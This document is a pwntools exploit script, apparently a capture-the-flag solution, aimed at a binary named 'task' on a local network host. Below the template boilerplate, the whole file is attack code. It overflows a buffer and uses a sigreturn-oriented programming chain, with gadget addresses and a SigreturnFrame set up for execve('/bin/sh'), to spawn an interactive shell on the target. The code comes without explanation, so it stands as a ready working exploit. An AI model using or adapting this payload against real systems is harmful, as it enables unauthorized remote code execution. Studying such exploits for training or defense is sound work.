#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --port 1555 --host 192.168.12.13 task
from os import sched_yield
from pwn import *

# Set up pwntools for the correct architecture
elf = context.binary = ELF(args.EXE or "task")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "192.168.12.13"
port = int(args.PORT or 1555)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
b _start
r
""".format(**locals())

context.terminal = ["tmux", "splitw", "-h"]

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x40000)
# Stack:    Executable
# RWX:      Has RWX segments

io = start()

BINSH = elf.address + 0x1430
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3B
frame.rdi = BINSH
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = SYSCALL_RET

payload = b"A" * 8
payload += p64(POP_RAX)
payload += p64(0xF)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

io.sendline(payload)
io.interactive()
